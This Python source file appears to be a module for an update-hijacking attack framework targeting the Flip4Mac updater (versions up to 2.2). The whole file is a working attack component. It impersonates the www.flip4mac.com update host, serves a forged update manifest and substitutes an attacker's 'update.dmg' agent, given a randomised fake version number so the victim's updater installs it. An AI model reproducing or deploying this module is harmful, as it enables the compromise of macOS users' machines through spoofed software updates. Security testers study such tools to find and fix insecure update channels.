from modules import ModuleBase


class Flip4Mac(ModuleBase):
    name = 'Flip 4 Mac'
    version = '1.0'
    appver = '<= 2.2'
    author = ['Federico Kirschbaum < fedek +[AT]+ infobytesec.com>']
    description = ''
    agent_filename = './agent/osx/update.dmg'
    vh = '(www.flip4mac.com)' 
    requests = [
        {   'path': '/Updater/WMV/update2.plist.',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/flip4mac/manifiest.xml',
        },
        {   'path': '.dmg',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }